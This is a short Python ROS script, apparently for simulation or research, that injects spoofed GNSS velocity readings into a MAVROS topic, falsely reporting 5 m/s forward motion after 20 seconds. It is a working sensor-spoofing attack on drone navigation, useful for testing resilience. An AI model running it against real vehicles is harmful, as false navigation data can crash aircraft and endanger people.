#!/usr/bin/env python3
import rospy
from geometry_msgs.msg import TwistStamped
import random

def attack_injector():
    rospy.init_node('attack_injector')
    pub = rospy.Publisher('/mavros/global_position/raw/vel', TwistStamped, queue_size=10)
    rate = rospy.Rate(10) # 10hz

    rospy.loginfo("Starting GNSS Spoofing Injection...")

    while not rospy.is_shutdown():
        msg = TwistStamped()
        msg.header.stamp = rospy.Time.now()
        
        if rospy.get_time() > 20.0:
            msg.twist.linear.x = 5.0 + random.uniform(-0.1, 0.1) 
        else:
            msg.twist.linear.x = 0.0 + random.uniform(-0.1, 0.1)
            
        pub.publish(msg)
        rate.sleep()

if __name__ == '__main__':
    try:
        attack_injector()
    except rospy.ROSInterruptException:
        pass